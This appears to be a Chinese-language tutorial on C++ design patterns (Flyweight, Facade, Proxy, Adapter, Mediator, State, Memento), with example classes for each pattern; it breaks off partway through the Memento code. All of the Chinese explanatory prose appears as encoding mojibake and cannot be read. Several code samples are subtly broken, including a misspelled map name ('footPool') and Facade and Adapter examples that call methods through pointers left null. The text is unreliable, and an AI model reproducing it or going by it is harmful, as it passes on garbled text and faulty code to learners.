12345678910111213141516171819202122232425262728293031323334class Font &#123;private: //unique object key string key; //object state //...public: Font(const string&amp; key)&#123;...&#125;&#125;;class FontFactory&#123;private: // ä½¿ç”¨mapä½œä¸ºä¸€ä¸ªå¯¹è±¡è®°å½• map&lt;string,Font* &gt; fontPool; public: Font* GetFont(const string&amp; key)&#123; map&lt;string,Font*&gt;::iterator item=fontPool.find(key); if(item!=footPool.end())&#123; return fontPool[key]; &#125; else&#123; Font* font = new Font(key); fontPool[key]= font; return font; &#125; &#125; void clear()&#123; //... &#125;&#125;; äº«å…ƒï¼Œåœ¨å¯¹è±¡æ•°é‡å¾ˆå¤šï¼Œå¹¶ä¸”å› æ­¤é€ æˆæ€§èƒ½è´Ÿæ‹…çš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;iostream&gt;#include &lt;map&gt;/* * Flyweight * declares an interface through which flyweights can receive * and act on extrinsic state */class Flyweight&#123;public: virtual ~Flyweight() &#123;&#125; virtual void operation() = 0; // ...&#125;;/* * UnsharedConcreteFlyweight * not all subclasses need to be shared */class UnsharedConcreteFlyweight : public Flyweight&#123;public: UnsharedConcreteFlyweight( const int intrinsic_state ) : state( intrinsic_state ) &#123;&#125; ~UnsharedConcreteFlyweight() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Unshared Flyweight with state \" &lt;&lt; state &lt;&lt; std::endl; &#125; // ... private: int state; // ...&#125;;/* * ConcreteFlyweight * implements the Flyweight interface and adds storage * for intrinsic state */class ConcreteFlyweight : public Flyweight&#123;public: ConcreteFlyweight( const int all_state ) : state( all_state ) &#123;&#125; ~ConcreteFlyweight() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Concrete Flyweight with state \" &lt;&lt; state &lt;&lt; std::endl; &#125; // ... private: int state; // ...&#125;;/* * FlyweightFactory * creates and manages flyweight objects and ensures * that flyweights are shared properly */class FlyweightFactory&#123;public: ~FlyweightFactory() &#123; for ( auto it = flies.begin(); it != flies.end(); it++ ) &#123; delete it-&gt;second; &#125; flies.clear(); &#125; Flyweight *getFlyweight( const int key ) &#123; if ( flies.find( key ) != flies.end() ) &#123; return flies[ key ]; &#125; Flyweight *fly = new ConcreteFlyweight( key ); flies.insert( std::pair&lt;int, Flyweight *&gt;( key, fly ) ); return fly; &#125; // ...private: std::map&lt;int, Flyweight*&gt; flies; // ...&#125;;int main()&#123; FlyweightFactory *factory = new FlyweightFactory; factory-&gt;getFlyweight(1)-&gt;operation(); factory-&gt;getFlyweight(2)-&gt;operation(); delete factory; return 0;&#125; æ¥å£éš”ç¦»ç›¸å…³æ¨¡å¼ åœ¨è½¯ä»¶æ„å»ºè¿‡ç¨‹ä¸­ï¼ŒæŸäº›æ¥å£ä¹‹é—´çš„â€œç›´æ¥â€ä¾èµ–å¯èƒ½ä¼šå¸¦æ¥å¾ˆå¤šé—®é¢˜ï¼Œç”šè‡³æ— æ³•å®ç°ã€‚è¿™æ—¶å€™ï¼Œå¾€å¾€é‡‡ç”¨æ·»åŠ ä¸€å±‚â€œé—´æ¥â€çš„ç¨³å®šæ¥å£å±‚ï¼Œæ¥å®ç°é—´æ¥çš„ä¾èµ–ã€‚ é—´æ¥çš„ä¸­é—´å±‚æ€æƒ³ï¼Œå¾ˆå¸¸è§ï¼Œæ¯”å¦‚æŒ‡é’ˆå°±æ˜¯ä¸€ç§é—´æ¥å±‚ï¼Œæ“ä½œç³»ç»Ÿæ˜¯ç”¨æˆ·ç¨‹åºå’Œæœºå™¨ç¡¬ä»¶ä¹‹é—´çš„ä¸­é—´å±‚ã€‚ å…¸å‹æ¨¡å¼ï¼š Facade (cä¸æ˜¯è‹±æ–‡å­—ç¬¦ï¼Œæ•´ä¸ªè¯æ˜¯ä¸ªæ³•æ–‡ï¼Œä¸è¿‡è¿™ä¸é‡è¦) Proxy Adapter Mediator Facade ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ï¼Œ Facadeæ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚ ç›®æ ‡æ•ˆæœå¦‚å›¾ï¼š Facadeæ¨¡å¼æ›´æ³¨é‡æ¶æ„å±‚æ¬¡ï¼Œåå‘æ¶æ„è®¾è®¡çš„æ¨¡å¼ã€‚å®ç°äº†å†…éƒ¨ç»„ä»¶å’Œå¤–éƒ¨å®¢æˆ·ç¨‹åºçš„è§£è€¦ã€‚å…¶å†…éƒ¨ç»„ä»¶ä¸€èˆ¬æ˜¯ç›¸äº’ä¾èµ–çš„ä¸€ç³»åˆ—ç±»å‹ã€‚ Facadeæ¨¡å¼ä¸ºä¸€ä¸ªå¤æ‚å­ç³»ç»Ÿæä¾›ä¸€ä¸ªç®€å•æ¥å£æ—¶ã€‚å­ç³»ç»Ÿå¾€å¾€å› ä¸ºä¸æ–­æ¼”åŒ–è€Œå˜å¾—è¶Šæ¥è¶Šå¤æ‚ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;/* * Subsystems * implement more complex subsystem functionality * and have no knowledge of the facade */class SubsystemA&#123;public: void suboperation() &#123; std::cout &lt;&lt; \"Subsystem A method\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;class SubsystemB&#123;public: void suboperation() &#123; std::cout &lt;&lt; \"Subsystem B method\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;class SubsystemC&#123;public: void suboperation() &#123; std::cout &lt;&lt; \"Subsystem C method\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;/* * Facade * delegates client requests to appropriate subsystem object * and unified interface that is easier to use */class Facade&#123;public: Facade() : subsystemA(), subsystemB(), subsystemC() &#123;&#125; void operation1() &#123; subsystemA-&gt;suboperation(); subsystemB-&gt;suboperation(); // ... &#125; void operation2() &#123; subsystemC-&gt;suboperation(); // ... &#125; // ... private: SubsystemA *subsystemA; SubsystemB *subsystemB; SubsystemC *subsystemC; // ...&#125;;int main()&#123; Facade *facade = new Facade(); facade-&gt;operation1(); facade-&gt;operation2(); delete facade; return 0;&#125; Proxy åœ¨é¢å‘å¯¹è±¡çš„ç³»ç»Ÿä¸­ï¼Œæœ‰äº›å¯¹è±¡å¯èƒ½ç”±äºï¼Œå¯¹è±¡åˆ›å»ºå¼€é”€å¾ˆå¤§ã€éœ€è¦é¢å¤–å®‰å…¨æ§åˆ¶ã€éœ€è¦è¿›ç¨‹å¤–çš„è®¿é—®æ“ä½œç­‰ï¼Œç›´æ¥è®¿é—®å¯¹è±¡ä¼šéº»çƒ¦ã€‚ æ¯”å¦‚è¯´ï¼ŒåŠ è½½ä¸€ä¸ªwordæ–‡æ¡£ï¼Œå¦‚æœæœ‰å¾ˆå¤šå›¾ç‰‡ï¼Œè‚¯å®šä¸ä¼šå¸Œæœ›åœ¨æ‰“å¼€æ–‡ä»¶æ—¶å°±å®Œæˆå¯¹æ‰€æœ‰å›¾ç‰‡çš„åŠ è½½å·¥ä½œï¼Œé‚£æ ·ä¼šå¾ˆæ…¢ã€‚è¿™æ—¶å€™ï¼Œå¯ä»¥è½¬åŒ–ä¸ºåŠ è½½ä¸€ä¸ªå›¾ç‰‡çš„proxyä»£ç†ï¼Œå½“æµè§ˆåˆ°è¯¥å›¾ç‰‡æ˜¯ï¼Œå†é€šè¿‡proxyåŠ è½½ç›¸åº”å›¾ç‰‡ã€‚ Proxyä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚ é€šå¸¸Proxyä¼šä¿æŒåŸå¯¹è±¡çš„æ¥å£ï¼Œè¿™ä¸ªè¢«å«åšâ€œé€æ˜æ“ä½œâ€ã€‚ä½†æ˜¯ä¹Ÿä¸ä¸€å®šå®Œå…¨ä¿æŒåŸå¯¹è±¡æ¥å£ã€‚ Proxyå¯èƒ½ä¼šä½œç”¨äºä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå¯èƒ½ä½œç”¨äºä¸€ä¸ªå¤§çš„ç³»ç»Ÿï¼Œå®ç°èµ·æ¥å¯èƒ½ä¼šå¾ˆå¤æ‚ã€‚ å¦ä¸€ä¸ªä½¿ç”¨åœºæ™¯æ˜¯å¯¹ç”¨æˆ·éšè—å¦ä¸€ç§ç§°ä¹‹ä¸º copy-on-writeçš„ä¼˜åŒ–æ–¹å¼ï¼Œè¯¥ä¼˜åŒ–ä¸æ ¹æ®éœ€è¦åˆ›å»ºå¯¹è±¡æœ‰å…³ã€‚æ‹·è´ä¸€ä¸ªåºå¤§è€Œå¤æ‚çš„å¯¹è±¡æ˜¯ä¸€ç§å¼€é”€å¾ˆå¤§çš„æ“ä½œï¼Œå¦‚æœè¿™ä¸ªæ‹·è´æ ¹æœ¬æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿™äº›å¼€é”€å°±æ²¡æœ‰å¿…è¦ã€‚ç”¨ä»£ç†å»¶è¿Ÿè¿™ä¸€æ‹·è´è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿è¯åªæœ‰å½“è¿™ä¸ªå¯¹è±¡è¢«ä¿®æ”¹çš„æ—¶å€™æ‰å¯¹å®ƒè¿›è¡Œæ‹·è´ã€‚ åœ¨å®ç° Copy-on-writeæ—¶å¿…é¡»å¯¹å®ä½“è¿›è¡Œå¼•ç”¨è®¡æ•°ã€‚æ‹·è´ä»£ç†ä»…ä¼šå¢åŠ å¼•ç”¨è®¡æ•°ã€‚åªæœ‰å½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªä¿®æ”¹è¯¥å®ä½“çš„æ“ä½œæ—¶ï¼Œä»£ç†æ‰ä¼šçœŸæ­£çš„æ‹·è´å®ƒã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç†è¿˜å¿…é¡»å‡å°‘å®ä½“çš„å¼•ç”¨è®¡æ•°ã€‚å½“å¼•ç”¨çš„æ•°ç›®ä¸ºé›¶æ—¶ï¼Œè¿™ä¸ªå®ä½“å°†è¢«åˆ é™¤ã€‚ Copy-on-Writeå¯ä»¥å¤§å¹…åº¦çš„é™ä½æ‹·è´åºå¤§å®ä½“æ—¶çš„å¼€é”€ã€‚ ä¸‹é¢æ˜¯ä¸€äº›å¯ä»¥ä½¿ç”¨ Proxyæ¨¡å¼å¸¸è§æƒ…å†µï¼š è¿œç¨‹ä»£ç†ï¼ˆRemote Proxyï¼‰ä¸ºä¸€ä¸ªå¯¹è±¡åœ¨ä¸åŒçš„åœ°å€ç©ºé—´æä¾›å±€éƒ¨ä»£è¡¨ã€‚ è™šä»£ç†ï¼ˆVirtual Proxyï¼‰æ ¹æ®éœ€è¦åˆ›å»ºå¼€é”€å¾ˆå¤§çš„å¯¹è±¡ã€‚ ä¿æŠ¤ä»£ç†ï¼ˆProtection Proxyï¼‰æ§åˆ¶å¯¹åŸå§‹å¯¹è±¡çš„è®¿é—®ã€‚ä¿æŠ¤ä»£ç†ç”¨äºå¯¹è±¡åº”è¯¥æœ‰ä¸åŒçš„è®¿é—®æƒé™çš„æ—¶å€™ã€‚ æ™ºèƒ½æŒ‡å¼• ï¼ˆSmart Referenceï¼‰å–ä»£äº†ç®€å•çš„æŒ‡é’ˆï¼Œå®ƒåœ¨è®¿é—®å¯¹è±¡æ—¶æ‰§è¡Œä¸€äº›é™„åŠ æ“ä½œã€‚å®ƒçš„å…¸å‹ç”¨é€”åŒ…æ‹¬ï¼š å¯¹æŒ‡å‘å®é™…å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œè¿™æ ·å½“è¯¥å¯¹è±¡æ²¡æœ‰å¼•ç”¨æ—¶ï¼Œå¯ä»¥è‡ªåŠ¨é‡Šæ”¾å®ƒ (ä¹Ÿç§°ä¸º Smart Pointers )ã€‚ å½“ç¬¬ä¸€æ¬¡å¼•ç”¨ä¸€ä¸ªæŒä¹…å¯¹è±¡æ—¶ï¼Œå°†å®ƒè£…å…¥å†…å­˜ã€‚ åœ¨è®¿é—®ä¸€ä¸ªå®é™…å¯¹è±¡å‰ï¼Œæ£€æŸ¥æ˜¯å¦å·²ç»é”å®šäº†å®ƒï¼Œä»¥ç¡®ä¿å…¶ä»–å¯¹è±¡ä¸èƒ½æ”¹å˜å®ƒã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;iostream&gt;/* * Subject * defines the common interface for RealSubject and Proxy * so that a Proxy can be used anywhere a RealSubject is expected */class Subject&#123;public: virtual ~Subject() &#123; /* ... */ &#125; virtual void request() = 0; // ...&#125;;/* * Real Subject * defines the real object that the proxy represents */class RealSubject : public Subject&#123;public: void request() &#123; std::cout &lt;&lt; \"Real Subject request\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Proxy * maintains a reference that lets the proxy access the real subject */class Proxy : public Subject&#123;public: Proxy() &#123; subject = new RealSubject(); &#125; ~Proxy() &#123; delete subject; &#125; void request() &#123; subject-&gt;request(); &#125; // ...private: RealSubject *subject;&#125;;int main()&#123; Proxy *proxy = new Proxy(); proxy-&gt;request(); delete proxy; return 0;&#125; Adapter åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰æ—¶ä¼šéœ€è¦å°† ä¸€äº›ç°æœ‰çš„å¯¹è±¡ æ”¾åœ¨æ–°çš„ç¯å¢ƒä¸­ä½¿ç”¨ã€‚ä½†æ˜¯æ­¤æ—¶çš„æ¥å£å‘ç”Ÿäº†å˜åŒ–ã€‚ Adapterå°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ã€‚ Adapteræ¨¡å¼ä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚ä¹Ÿè¢«ç§°ä¸ºWrapperã€‚ æ¨¡å¼è¡¨è¾¾å¦‚ä¸‹ï¼š Adapterç»§æ‰¿Targetä¿æŒäº†å½¢åŒæ¥å£ï¼ŒåŒæ—¶ç»„åˆäº†ä¸€ä¸ªAdapteeå¯¹è±¡ï¼Œå¯ä»¥è°ƒç”¨Adapteeçš„æ–¹æ³•ã€‚ æŠ½è±¡ä»£ç ç»“æ„ ä½¿ç”¨å¤šç»§æ‰¿çš„æ–¹å¼ï¼Œç±»adapterã€‚ä½†æ˜¯ä¾ç„¶æ¨èç»„åˆè€Œä¸æ˜¯ç»§æ‰¿ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;/* * Target * defines specific interface that Client uses */class Target&#123;public: virtual ~Target() &#123;&#125; virtual void request() = 0; // ...&#125;;/* * Adaptee * defines an existing interface that needs adapting and thanks * to Adapter it will get calls that client makes on the Target * */class Adaptee&#123;public: void specificRequest() &#123; std::cout &lt;&lt; \"specific request\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Adapter * implements the Target interface and when it gets a method call it * delegates the call to a Adaptee */class Adapter : public Target&#123;public: Adapter() : adaptee() &#123;&#125; ~Adapter() &#123; delete adaptee; &#125; void request() &#123; adaptee-&gt;specificRequest(); // ... &#125; // ...private: Adaptee *adaptee; // ...&#125;;int main()&#123; Target *t = new Adapter(); t-&gt;request(); delete t; return 0;&#125; ä½¿ç”¨ç»„åˆå¯¹è±¡ï¼Œå¯¹è±¡adapter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;/* * Target * defines specific interface that Client uses */class Target&#123;public: virtual ~Target() &#123;&#125; virtual void request() = 0; // ...&#125;;/* * Adaptee * all requests get delegated to the Adaptee which defines * an existing interface that needs adapting */class Adaptee&#123;public: ~Adaptee() &#123;&#125; void specificRequest() &#123; std::cout &lt;&lt; \"specific request\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Adapter * implements the Target interface and lets the Adaptee respond * to request on a Target by extending both classes * ie adapts the interface of Adaptee to the Target interface */class Adapter : public Target, private Adaptee&#123;public: virtual void request() &#123; specificRequest(); &#125; // ...&#125;;int main()&#123; Target *t = new Adapter(); t-&gt;request(); delete t; return 0;&#125; Mediator å¤„ç†å¤šä¸ªå¯¹è±¡ç›¸äº’å…³è”ï¼Œå¹¶ä¸”å…¶å¼•ç”¨å…³ç³»å¤æ‚ï¼Œä½¿å¾—æ”¹å˜å˜å¾—ä¸é‚£ä¹ˆå®¹æ˜“ã€‚ Mediatorç”¨ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—çš„å¯¹è±¡äº¤äº’ã€‚ä¸­ä»‹è€…ä½¿å„å¯¹è±¡ä¸éœ€è¦æ˜¾å¼åœ°ç›¸äº’å¼•ç”¨ï¼Œä»è€Œä½¿å…¶è€¦åˆæ¾æ•£ï¼Œè€Œä¸”å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚ å’ŒFacadeå¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯Mediatoræ˜¯ä½œç”¨äºå†…éƒ¨å¯¹è±¡ä¹‹é—´çš„ï¼ŒåŒå‘çš„å…³ç³»ã€‚Facadeæ˜¯è§£è€¦å†…éƒ¨å¯¹è±¡å’Œå¤–éƒ¨ç¯å¢ƒçš„ï¼Œå•å‘çš„å…³ç³»ã€‚ å›¾ä¸­å¿½ç•¥äº†Mediatorä¸Colleaguä¹‹é—´çš„é€šä¿¡å®ç°ï¼Œè¿™ä¸ªå¾€å¾€æ˜¯å¤æ‚çš„ã€‚å…¶ä¸­å¯ä»¥ç”¨åˆ°Observeræ¨¡å¼ï¼Œæ¥è‡ªåŠ¨æ£€æµ‹ä¸åŒå¯¹è±¡é—´çš„é€šä¿¡è½¬æ¢ã€‚ Mediatorä¸­æœ‰Colleagueçš„æŒ‡é’ˆæˆå‘˜ï¼ŒColleagueä¸­æœ‰Mediatorçš„æŒ‡é’ˆæˆå‘˜ã€‚æ–¹ä¾¿ä¸¤è€…ä¹‹é—´çš„ç›¸äº’è°ƒç”¨ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;class Mediator;/* * Colleague classes * each colleague communicates with its mediator whenever * it would have otherwise communicated with another colleague */class Colleague&#123;public: Colleague( Mediator* const m, const unsigned int i ) : mediator( m ), id( i ) &#123;&#125; virtual ~Colleague() &#123;&#125; unsigned int getID() &#123; return id; &#125; virtual void send( std::string ) = 0; virtual void receive( std::string ) = 0;protected: Mediator *mediator; unsigned int id;&#125;;class ConcreteColleague : public Colleague&#123;public: ConcreteColleague( Mediator* const m, const unsigned int i ) : Colleague( m, i ) &#123;&#125; ~ConcreteColleague() &#123;&#125; void send( std::string msg ); void receive( std::string msg ) &#123; std::cout &lt;&lt; \"Message '\" &lt;&lt; msg &lt;&lt; \"' received by Colleague \" &lt;&lt; id &lt;&lt; std::endl; &#125;&#125;;/* * Mediator * defines an interface for communicating with Colleague objects */class Mediator&#123;public: virtual ~Mediator() &#123;&#125; virtual void add( Colleague* const c ) = 0; virtual void distribute( Colleague* const sender, std::string msg ) = 0;protected: Mediator() &#123;&#125;&#125;;/* * Concrete Mediator * implements cooperative behavior by coordinating Colleague objects * and knows its colleagues */class ConcreteMediator : public Mediator&#123;public: ~ConcreteMediator() &#123; for ( unsigned int i = 0; i &lt; colleagues.size(); i++ ) &#123; delete colleagues[ i ]; &#125; colleagues.clear(); &#125; void add( Colleague* const c ) &#123; colleagues.push_back( c ); &#125; void distribute( Colleague* const sender, std::string msg ) &#123; for ( unsigned int i = 0; i &lt; colleagues.size(); i++ ) &#123; if ( colleagues.at( i )-&gt;getID() != sender-&gt;getID() ) &#123; colleagues.at( i )-&gt;receive( msg ); &#125; &#125; &#125;private: std::vector&lt;Colleague*&gt; colleagues;&#125;;void ConcreteColleague::send( std::string msg )&#123; std::cout &lt;&lt; \"Message '\"&lt;&lt; msg &lt;&lt; \"' sent by Colleague \" &lt;&lt; id &lt;&lt; std::endl; mediator-&gt;distribute( this, msg );&#125;int main()&#123; Mediator *mediator = new ConcreteMediator(); Colleague *c1 = new ConcreteColleague( mediator, 1 ); Colleague *c2 = new ConcreteColleague( mediator, 2 ); Colleague *c3 = new ConcreteColleague( mediator, 3 ); mediator-&gt;add( c1 ); mediator-&gt;add( c2 ); mediator-&gt;add( c3 ); c1-&gt;send( \"Hi!\" ); c3-&gt;send( \"Hello!\" ); delete mediator; return 0;&#125; çŠ¶æ€å˜åŒ–ç›¸å…³æ¨¡å¼ å…³æ³¨å¯¹è±¡çŠ¶æ€çš„æ”¹å˜ï¼Œå¯¹è¿™äº› å˜åŒ–çš„çŠ¶æ€è¿›è¡Œç®¡ç†ï¼Œç»´æŒæ›´é«˜å±‚æ¨¡å—çš„ç¨³å®šã€‚ å…¸å‹æ¨¡å¼ï¼š State Memento State æŸäº›å¯¹è±¡çš„çŠ¶æ€å¦‚æœå‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆå®ƒçš„è¡Œä¸ºä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ã€‚æ¯”å¦‚æ–‡ä»¶çš„è¯»å†™çŠ¶æ€å˜åŒ–ã€‚ Stateæ¨¡å¼å…è®¸ä¸€ä¸ªå¯¹è±¡åœ¨å…¶å†…éƒ¨çŠ¶æ€æ”¹å˜æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºã€‚å¯¹è±¡çœ‹èµ·æ¥ä¼¼ä¹ä¿®æ”¹äº†å®ƒçš„ç±»ã€‚ ç±»ä¼¼Strategyæ¨¡å¼ï¼Œä½†æ˜¯è¿™é‡Œå…³æ³¨çŠ¶æ€çš„å˜åŒ–ã€‚ ç¤ºä¾‹1 å®ç°å¯¹ç½‘ç»œè¿æ¥çŠ¶æ€çš„è·Ÿè¸ªå’Œå¤„ç†ã€‚ å®ç°ä¸€ï¼Œä½¿ç”¨æ¡ä»¶åˆ¤æ–­ï¼Œå¤„ç†å’Œè½¬æ¢çŠ¶æ€ã€‚ 12345678910111213141516171819202122enum NetworkState &#123; Network_Open, Network_Close, Network_Connect,&#125;;class NetworkProcessor&#123; NetworkState state;public: void Operation()&#123; if (state == Network_Open)&#123; ... state = Network_Close; &#125; else if (state == Network_Close)&#123; ... state = Network_Connect; &#125; else if (state == Network_Connect)&#123; ... state = Network_Open; &#125; &#125;&#125;; å®ç°äºŒï¼ŒæŠ½è±¡å‡ºçŠ¶æ€å¯¹è±¡ï¼ŒçŠ¶æ€å¯¹è±¡è‡ªå·±å¤„ç†è‡ªå·±çš„è½¬æ¢å…³ç³»ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243// çŠ¶æ€å¯¹è±¡åŸºç±»class NetworkState&#123;public: NetworkState* pNext; virtual void Operation1()=0; virtual void Operation2()=0; virtual void Operation3()=0; virtual ~NetworkState()&#123;&#125;&#125;;// å…·ä½“çŠ¶æ€å¯¹è±¡ï¼Œå¯è®¾è®¡ä¸ºSingletonclass OpenState :public NetworkState&#123; static NetworkState* m_instance;public: static NetworkState* getInstance()&#123; if (m_instance == nullptr) &#123; m_instance = new OpenState(); &#125; return m_instance; &#125; // æ”¹å˜ pNext æŒ‡é’ˆï¼ŒæŠ½è±¡è½¬æ¢å¯¹è±¡çŠ¶æ€ã€‚ void Operation1()&#123; ... pNext = CloseState::getInstance(); &#125; void Operation2()&#123; ... pNext = ConnectState::getInstance(); &#125; void Operation3()&#123; ... pNext = OpenState::getInstance(); &#125;&#125;;// æ›´å¤šçš„å…·ä½“çŠ¶æ€å¯¹è±¡ï¼Œå¯æ‰©å±•class CloseState:public NetworkState&#123; ... &#125;... 12345678910111213141516171819202122232425// åº”ç”¨ç±»ï¼Œç¨³å®šï¼Œä¸€èˆ¬å¯ä¿æŒä¸å˜class NetworkProcessor&#123; NetworkState* pState; public: NetworkProcessor(NetworkState* pState)&#123; this-&gt;pState = pState; &#125; // é€šè¿‡ çŠ¶æ€å¯¹è±¡ å¤„ç†çŠ¶æ€è½¬æ¢ void Operation1()&#123; pState-&gt;Operation1(); pState = pState-&gt;pNext; &#125; void Operation2()&#123; pState-&gt;Operation2(); pState = pState-&gt;pNext; &#125; void Operation3()&#123; pState-&gt;Operation3(); pState = pState-&gt;pNext; &#125;&#125;; Stateæ¨¡å¼å°†çŠ¶æ€çš„æ”¹å˜ï¼Œå®ç°ä¸ºçŠ¶æ€å¯¹è±¡çš„æ”¹å˜ï¼Œé€šè¿‡æŠ½è±¡åŸºç±»ï¼Œä¸å†ä¾èµ–å…·ä½“å¯¹è±¡ã€‚è€Œä¸”ï¼ŒçŠ¶æ€çš„è½¬æ¢æ›´åŠ æ˜ç¡®ï¼Œä¸æ˜“å‡ºé”™ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;/* * State * defines an interface for encapsulating the behavior associated * with a particular state of the Context */class State&#123;public: virtual ~State() &#123; /* ... */ &#125; virtual void handle() = 0; // ...&#125;;/* * Concrete States * each subclass implements a behavior associated with a state * of the Context */class ConcreteStateA : public State&#123;public: ~ConcreteStateA() &#123; /* ... */ &#125; void handle() &#123; std::cout &lt;&lt; \"State A handled.\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteStateB : public State&#123;public: ~ConcreteStateB() &#123; /* ... */ &#125; void handle() &#123; std::cout &lt;&lt; \"State B handled.\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Context * defines the interface of interest to clients */class Context&#123;public: Context() : state() &#123; /* ... */ &#125; ~Context() &#123; delete state; &#125; void setState( State* const s ) &#123; if ( state ) &#123; delete state; &#125; state = s; &#125; void request() &#123; state-&gt;handle(); &#125; // ...private: State *state; // ...&#125;;int main()&#123; Context *context = new Context(); context-&gt;setState( new ConcreteStateA() ); context-&gt;request(); context-&gt;setState( new ConcreteStateB() ); context-&gt;request(); delete context; return 0;&#125; Memento å½“ä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦ä¿å­˜ä¸€ä¸ªæˆ–è€…å¤šä¸ªå†…å­˜å¿«ç…§ï¼Œç”¨äºæœªæ¥æ¢å¤åˆ°å½“å‰å¯¹è±¡çŠ¶æ€ã€‚è¿™æ—¶ï¼Œä¼šå‡ºç°ä¸€ä¸ªæ½œåœ¨é—®é¢˜ï¼Œå¯¹è±¡çš„å®ç°ç»†èŠ‚å¯èƒ½ä¼šæš´éœ²ã€‚ Mementoçš„æƒ³æ³•ï¼Œå°±æ˜¯æ‰¾å¦ä¸€ä¸ªå°é—­çš„å¯¹è±¡Bï¼Œä¿å­˜å½“å‰å¯¹è±¡Açš„çŠ¶æ€ï¼Œå¹¶åœ¨éœ€è¦çš„æ—¶å€™ç”¨äºæ¢å¤å¯¹è±¡Açš„çŠ¶æ€ã€‚ Mementoåœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ã€‚è¿™æ ·ä»¥åå°±å¯å°†è¯¥å¯¹è±¡æ¢å¤åˆ°åŸå…ˆä¿å­˜çš„çŠ¶æ€ã€‚ è¿™ä¸ªæ¨¡å¼å°±æ˜¯ä¸ºäº†éšè—å¯¹è±¡ä¿¡æ¯ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºåœ°å°†ä¸€ä¸ªä¸€ä¸ªæˆå‘˜å˜é‡å¯¼å‡ºä¿å­˜ã€‚ ä½†æ˜¯ï¼Œè¿™ä¸ªæ¨¡å¼å®ç°åœ°å†…å­˜å¿«ç…§æ–¹æ³•ï¼Œå·²ç»è¿‡æ—¶äº†ï¼Œç°åœ¨å¾€å¾€ä¼šé‡‡ç”¨æ•ˆç‡æ›´é«˜ã€æ›´ç®€æ´åœ°åºåˆ—åŒ–æ–¹æ³•æ¥å®ç°ã€‚ æŠ½è±¡ä»£ç å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;iostream&gt;#include &lt;vector&gt;/* * Memento * stores internal state of the Originator object and protects * against access by objects other than the originator */class Memento&#123;private: // accessible only to Originator friend class Originator; Memento( const int s ) : state( s ) &#123;&#125; void setState( const int s ) &#123; state = s; &#125; int getState() &#123; return state; &#125; // ...private: int state; // ...&#125;;/* * Originator * creates a memento containing a snapshot of its current internal * state and uses the memento to restore its internal state */class Originator&#123;public: // 